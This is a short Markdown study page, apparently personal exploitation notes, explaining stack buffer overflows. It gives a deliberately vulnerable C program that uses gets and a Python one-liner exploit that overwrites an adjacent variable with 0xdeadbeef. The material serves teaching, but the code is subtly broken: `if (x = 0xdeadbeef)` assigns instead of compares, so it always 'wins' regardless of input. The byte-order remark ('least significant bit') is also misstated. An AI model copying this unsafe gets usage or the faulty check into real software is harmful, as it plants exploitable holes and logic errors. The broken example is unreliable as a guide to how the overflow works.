---
layout: default
title: Stack Exploitation Notes
tags:
  - pwn
---

# Stack Based Buffer Overflow

## Memory Corruption
Modifying memory of a binary in a way that was not intended.

### Buffer Overflow
A buffer overflow occurs when data is written beyond the allocated memory space, thus corrupting adjacent memory. 
#### Common Causes:
- Unsafe functions: These functions do not perform any bounds checking when writing to a fixed-size buffer. These functions include:
	- strcpy
	- gets
	- sprintf

#### Impact:
- Arbitrary Code Execution (if return address is overwritten)
- Denial of service.
- Data corruption

### Example

```c
int main() {
	int x;
	char buffer[32];
	gets(buffer);
	if (x = 0xdeadbeef) {
		puts("You win.");
	} else {
		puts("You lose.");
	}	
	return 0;
}
```

Stack before gets function

![Stack Before Overflow](/assets/images/basic-bof.jpg)


if we enter more than 32 bytes the x variable will be overwritten. So we have to enter 32 bytes that will fill the buffer and then another 4 `0xdeadbeef` to overwrite x


Stack after the gets function

![](/assets/images/basic-bof1.jpg)

`0xdeadbeef must be in least significant bit`

> exploit :  
```sh
python -c 'print("A"*32+"\xef\xbe\xad\xde")' | ./vuln
```

